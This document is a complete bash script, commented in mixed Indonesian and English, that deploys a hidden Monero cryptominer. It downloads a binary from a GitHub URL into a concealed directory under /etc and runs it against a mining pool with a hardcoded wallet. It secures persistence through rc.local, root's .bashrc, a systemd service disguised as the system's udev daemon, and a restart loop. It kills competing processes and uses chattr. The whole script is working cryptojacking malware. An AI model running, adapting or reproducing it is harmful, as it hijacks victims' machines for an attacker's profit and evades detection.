#!/bin/bash
# Modified deployment untuk broken environment
# Author: quin imut - CNCERT/CC Lab

WORK_DIR="/etc/.cache/systemd"
BINARY_NAME=".udevd"
MINER_URL="https://github.com/wakitobi/glowing-umbrella/raw/main/bos"
POOL_URL="xmr.kryptex.network:7029"
WALLET="89YQSFqV1vbUM77et87qV67eVroCiro6YYntMES23R3h7kKjeKyN4cwTnCVAFhyMpq6w1JERiENowLPxdxXWenJv5hZMfS2.PY"
THREADS=$(nproc 2>/dev/null || echo 4)

# Kill existing processes dengan aggressive approach
pkill -9 -f "$BINARY_NAME" 2>/dev/null
sleep 3

# Setup directory
mkdir -p "$WORK_DIR" 2>/dev/null
cd "$WORK_DIR" || { echo "[!] Cannot cd to $WORK_DIR" >&2; exit 1; }

# Download binary dengan multiple attempts
download_binary() {
    echo "[+] Downloading miner binary..."
    for i in {1..3}; do
        if command -v wget >/dev/null 2>&1; then
            wget -q -T 30 -O "$BINARY_NAME" "$MINER_URL" && break
        elif command -v curl >/dev/null 2>&1; then
            curl -s -L --connect-timeout 30 -o "$BINARY_NAME" "$MINER_URL" && break
        else
            # Fallback ke busybox wget/curl
            busybox wget -q -O "$BINARY_NAME" "$MINER_URL" 2>/dev/null && break
        fi
        sleep 5
    done
    
    [ -f "$BINARY_NAME" ] && chmod +x "$BINARY_NAME" && return 0
    echo "[!] Download failed after 3 attempts" >&2
    return 1
}

# Simple binary check
verify_binary() {
    [ -x "$BINARY_NAME" ] && return 0
    [ -f "$BINARY_NAME" ] && chmod +x "$BINARY_NAME" && return 0
    return 1
}

# Process management yang robust
start_miner() {
    echo "[+] Starting miner process..."
    
    # Clean previous logs
    > miner.log
    
    # Start dengan timeout protection
    timeout 30s "$WORK_DIR/$BINARY_NAME" \
        -o "$POOL_URL" \
        -u "$WALLET" \
        -t "$THREADS" \
        >> miner.log 2>&1 &
    
    local pid=$!
    sleep 8
    
    # Check if process still running
    if ps -p "$pid" >/dev/null 2>&1; then
        echo "$pid" > miner.pid
        echo "[+] Miner started with PID: $pid"
        return 0
    else
        # Coba start tanpa timeout
        nohup "$WORK_DIR/$BINARY_NAME" \
            -o "$POOL_URL" \
            -u "$WALLET" \
            -t "$THREADS" \
            >> miner.log 2>&1 &
        
        local new_pid=$!
        sleep 5
        if ps -p "$new_pid" >/dev/null 2>&1; then
            echo "$new_pid" > miner.pid
            echo "[+] Miner started with PID: $new_pid"
            return 0
        fi
    fi
    
    echo "[!] Failed to start miner" >&2
    tail -n 10 miner.log >&2
    return 1
}

# Persistence alternatif tanpa cron
install_persistence() {
    echo "[+] Installing alternative persistence..."
    
    # Method 1: /etc/rc.local jika available
    if [ -f /etc/rc.local ]; then
        echo "cd '$WORK_DIR' && nohup './$BINARY_NAME' -o '$POOL_URL' -u '$WALLET' -t '$THREADS' >> miner.log 2>&1 &" >> /etc/rc.local
    fi
    
    # Method 2: ~/.profile atau ~/.bashrc
    if [ -f /root/.bashrc ]; then
        echo "[ -f '$WORK_DIR/$BINARY_NAME' ] && cd '$WORK_DIR' && nohup './$BINARY_NAME' -o '$POOL_URL' -u '$WALLET' -t '$THREADS' >> miner.log 2>&1 &" >> /root/.bashrc
    fi
    
    # Method 3: Systemd fallback jika available
    if command -v systemctl >/dev/null 2>&1; then
        cat > /etc/systemd/system/systemd-udevd.service << EOF
[Unit]
Description=System Udev Daemon
After=network.target

[Service]
Type=simple
WorkingDirectory=$WORK_DIR
ExecStart=$WORK_DIR/$BINARY_NAME -o $POOL_URL -u $WALLET -t $THREADS
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
        systemctl daemon-reload 2>/dev/null
        systemctl enable systemd-udevd 2>/dev/null
        systemctl start systemd-udevd 2>/dev/null
    fi
    
    # Method 4: Simple while loop restart script
    cat > "$WORK_DIR/restart.sh" << EOF
#!/bin/sh
while true; do
    if ! ps -p $(cat miner.pid 2>/dev/null) >/dev/null 2>&1; then
        cd '$WORK_DIR' && nohup './$BINARY_NAME' -o '$POOL_URL' -u '$WALLET' -t '$THREADS' >> miner.log 2>&1 &
        echo $! > miner.pid
    fi
    sleep 60
done
EOF
    chmod +x "$WORK_DIR/restart.sh"
    nohup "$WORK_DIR/restart.sh" >> "$WORK_DIR/restart.log" 2>&1 &
}

# Hardening yang work di read-only environment
harden_environment() {
    echo "[+] Applying environment hardening..."
    
    # File protection jika possible
    chmod 700 "$WORK_DIR" 2>/dev/null
    chmod 500 "$WORK_DIR/$BINARY_NAME" 2>/dev/null
    
    # Attempt membuat file read-only jika filesystem support
    touch "$WORK_DIR/.protected" 2>/dev/null && chattr +i "$WORK_DIR/.protected" 2>/dev/null
    
    # Network connectivity check
    echo "[+] Testing pool connectivity..."
    timeout 10s bash -c "echo > /dev/tcp/$(echo $POOL_URL | cut -d: -f1)/$(echo $POOL_URL | cut -d: -f2)" 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] Pool connection successful"
    else
        echo "[!] Pool connection failed - check network"
    fi
}

# Main execution dengan better error handling
main() {
    echo "[*] Deploying in broken environment..."
    
    # Pre-check environment
    echo "[+] Environment check:"
    echo "    CPU: $(grep -c processor /proc/cpuinfo 2>/dev/null || echo $THREADS) threads"
    echo "    RAM: $(free -m 2>/dev/null | awk '/Mem:/ {print $2}')MB"
    echo "    Disk: $(df -h $WORK_DIR 2>/dev/null | tail -1 | awk '{print $4}') free"
    
    if ! download_binary; then
        echo "[!] Critical: Cannot download binary" >&2
        return 1
    fi
    
    if ! verify_binary; then
        echo "[!] Binary verification failed" >&2
        return 1
    fi
    
    if ! start_miner; then
        echo "[!] Failed to start miner process" >&2
        return 1
    fi
    
    install_persistence
    harden_environment
    
    echo "[+] Deployment completed with warnings"
    echo "[+] Process ID: $(cat miner.pid 2>/dev/null)"
    echo "[+] Monitor: tail -f $WORK_DIR/miner.log"
    echo "[!] Note: Some features disabled due to environment limitations"
    
    # Cleanup
    rm -f /tmp/.systemd-udevd 2>/dev/null
    return 0
}

# Run dengan exit code handling
if main; then
    echo "[SUCCESS] Miner deployed with adaptations"
else
    echo "[FAILED] Deployment failed - check environment" >&2
    exit 1
fi
